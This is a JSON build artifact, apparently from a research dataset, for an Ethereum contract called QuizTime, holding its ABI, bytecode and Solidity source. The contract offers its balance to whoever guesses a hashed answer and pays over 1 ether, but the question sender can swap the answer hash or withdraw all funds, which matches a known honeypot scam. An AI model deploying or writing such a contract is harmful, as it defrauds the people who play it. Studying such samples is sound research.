{
  "contractName": "QuizTime",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "question",
      "outputs": [
        {
          "name": "",
          "type": "string"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "answer",
          "type": "string"
        }
      ],
      "name": "Guess",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_question",
          "type": "string"
        },
        {
          "name": "response",
          "type": "string"
        }
      ],
      "name": "StartGame",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "StopGame",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_question",
          "type": "string"
        },
        {
          "name": "_responseHash",
          "type": "bytes32"
        }
      ],
      "name": "NewQuestion",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506106d9806100206000396000f30060806040526004361061006d576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680631f1c827f1461006f5780633e3ee859146101115780633fad9ae01461017b578063a10222941461020b578063f50ab24714610267575b005b61010f600480360381019080803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290505050610271565b005b610179600480360381019080803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290803560001916906020019092919050505061034d565b005b34801561018757600080fd5b506101906103ca565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156101d05780820151818401526020810190506101b5565b50505050905090810190601f1680156101fd5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b610265600480360381019080803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290505050610468565b005b61026f610551565b005b600060010260005460001916141561034957806040518082805190602001908083835b6020831015156102b95780518252602082019150602081019050602083039250610294565b6001836020036101000a0380198251168184511680821785525050505050509050019150506040518091039020600081600019169055508160029080519060200190610306929190610608565b5033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b5050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614156103c65781600290805190602001906103b9929190610608565b5080600081600019169055505b5050565b60028054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156104605780601f1061043557610100808354040283529160200191610460565b820191906000526020600020905b81548152906001019060200180831161044357829003601f168201915b505050505081565b806040518082805190602001908083835b60208310151561049e5780518252602082019150602081019050602083039250610479565b6001836020036101000a038019825116818451168082178552505050505050905001915050604051809103902060001916600054600019161480156104ea5750670de0b6b3a764000034115b1561054e573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f1935050505015801561054c573d6000803e3d6000fd5b505b50565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415610606573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f19350505050158015610604573d6000803e3d6000fd5b505b565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f1061064957805160ff1916838001178555610677565b82800160010185558215610677579182015b8281111561067657825182559160200191906001019061065b565b5b5090506106849190610688565b5090565b6106aa91905b808211156106a657600081600090555060010161068e565b5090565b905600a165627a7a72305820fbe5658b0bbbda0d779c35b99253567ca4e6fb94a24df359451952136afa788f0029",
  "source": "\n\ncontract QuizTime\n{\n    bytes32 responseHash;\n    address questionSender;\n    string public question;\n \n    function Guess(string answer)\n    public payable {\n        if (responseHash == keccak256(answer) && msg.value>1 ether) {\n            msg.sender.transfer(this.balance);\n        }\n    }\n \n    function StartGame(string _question, string response)\n    public payable {\n        if (responseHash==0x0) {\n            responseHash = keccak256(response);\n            question = _question;\n            questionSender = msg.sender;\n        }\n    }\n\n    function StopGame()\n    public payable {\n        if (msg.sender==questionSender) {\n            msg.sender.transfer(this.balance);\n        }\n    }\n\n    function NewQuestion(string _question, bytes32 _responseHash)\n    public payable {\n        if (msg.sender==questionSender) {\n            question = _question;\n            responseHash = _responseHash;\n        }\n    }\n\n    function () public payable { }\n}",
  "sourcePath": "/home/XXX-1/smartrim-experiment/for-rlf/0x8a36f3e0da7b36fd22fcf2844c21e812279372ac/contracts/0x8a36f3e0da7b36fd22fcf2844c21e812279372ac.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-08-14T03:59:56.041Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}